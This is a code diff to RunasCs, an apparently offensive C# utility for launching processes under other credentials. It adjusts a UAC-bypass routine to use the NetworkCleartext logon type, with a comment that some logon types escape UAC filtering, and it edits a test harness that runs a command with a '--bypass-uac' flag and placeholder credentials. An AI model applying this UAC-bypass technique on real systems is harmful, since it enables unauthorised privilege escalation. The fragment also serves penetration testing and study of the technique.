@@ -373,15 +373,16 @@ public class RunasCs
         return true;
     }
 
-    // uac bypass discussed in this UAC quiz tweet --> https://twitter.com/splinter_code/status/1458054161472307204
+    // UAC bypass discussed in this UAC quiz tweet --> https://twitter.com/splinter_code/status/1458054161472307204
     // thanks @winlogon0 for the implementation --> https://github.com/AltF5/MediumToHighIL_Test/blob/main/TestCode2.cs
     private bool CreateProcessWithLogonWUacBypass(int logonType, string username, string domainName, string password, string processPath, string commandLine, ref STARTUPINFO startupInfo, out ProcessInformation processInfo) {
         bool result = false;
         IntPtr hToken = new IntPtr(0);
-        if (logonType == LOGON32_LOGON_NETWORK || logonType == LOGON32_LOGON_BATCH || logonType == LOGON32_LOGON_SERVICE)
+        // the below logon types are not filtered by UAC, we allow login with them. Otherwise stick with NetworkCleartext
+        if (logonType == LOGON32_LOGON_NETWORK || logonType == LOGON32_LOGON_BATCH || logonType == LOGON32_LOGON_SERVICE || logonType == LOGON32_LOGON_NETWORK_CLEARTEXT)
             result = LogonUser(username, domainName, password, logonType, LOGON32_PROVIDER_DEFAULT, ref hToken);
         else
-            result = LogonUser(username, domainName, password, LOGON32_LOGON_NETWORK, LOGON32_PROVIDER_DEFAULT, ref hToken);
+            result = LogonUser(username, domainName, password, LOGON32_LOGON_NETWORK_CLEARTEXT, LOGON32_PROVIDER_DEFAULT, ref hToken);
         if (result == false)
             throw new RunasCsException("CreateProcessWithLogonWUacBypass: Wrong Credentials. LogonUser failed with error code: " + Marshal.GetLastWin32Error());
 
@@ -1813,15 +1814,15 @@ class MainClass
     static void Main(string[] args)
     {
         string[] argsTest = new string[10];
-        argsTest[0] = "admin";
+        argsTest[0] = "tcbuser";
         argsTest[1] = "pwd";
-        argsTest[2] = "whoami /all";
-        argsTest[3] = "--bypass-uac";
-        //argsTest[2] = "ping -n 30 127.0.0.1";
-        //argsTest[3] = "--function";
-        //argsTest[4] = "2";
-        //argsTest[5] = "--logon-type";
-        //argsTest[6] = "2";
+        //argsTest[2] = "whoami /all";
+        argsTest[2] = "ping -n 30 127.0.0.1";
+        argsTest[3] = "--function";
+        argsTest[4] = "2";
+        argsTest[5] = "--logon-type";
+        argsTest[6] = "2";
+        argsTest[7] = "--bypass-uac";
         Console.Out.Write(RunasCsMainClass.RunasCsMain(argsTest));
     }
 }
